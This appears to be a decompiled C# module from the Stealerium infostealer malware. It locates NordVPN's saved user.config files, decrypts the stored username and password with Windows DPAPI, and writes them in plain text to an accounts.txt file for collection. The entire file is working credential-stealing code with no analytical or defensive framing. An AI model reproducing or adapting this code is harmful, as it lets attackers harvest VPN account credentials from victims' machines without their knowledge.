using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using Stealerium.Helpers;

namespace Stealerium.Target.VPN;

internal sealed class NordVpn
{
	private static string Decode(string s)
	{
		try
		{
			return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), (byte[])null, (DataProtectionScope)1));
		}
		catch
		{
			return "";
		}
	}

	public static void Save(string sSavePath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Paths.Lappdata, "NordVPN"));
		if (!directoryInfo.Exists)
		{
			return;
		}
		try
		{
			Directory.CreateDirectory(sSavePath);
			DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
			for (int i = 0; i < directories.Length; i++)
			{
				DirectoryInfo[] directories2 = directories[i].GetDirectories();
				foreach (DirectoryInfo directoryInfo2 in directories2)
				{
					string text = Path.Combine(directoryInfo2.FullName, "user.config");
					if (File.Exists(text))
					{
						Directory.CreateDirectory(sSavePath + "\\" + directoryInfo2.Name);
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(text);
						string text2 = xmlDocument.SelectSingleNode("//setting[@name='Username']/value")?.InnerText;
						string text3 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value")?.InnerText;
						if (text2 != null && !string.IsNullOrEmpty(text2) && text3 != null && !string.IsNullOrEmpty(text3))
						{
							string text4 = Decode(text2);
							string text5 = Decode(text3);
							Counter.Vpn++;
							File.AppendAllText(sSavePath + "\\" + directoryInfo2.Name + "\\accounts.txt", "Username: " + text4 + "\nPassword: " + text5 + "\n\n");
						}
					}
				}
			}
		}
		catch
		{
		}
	}
}
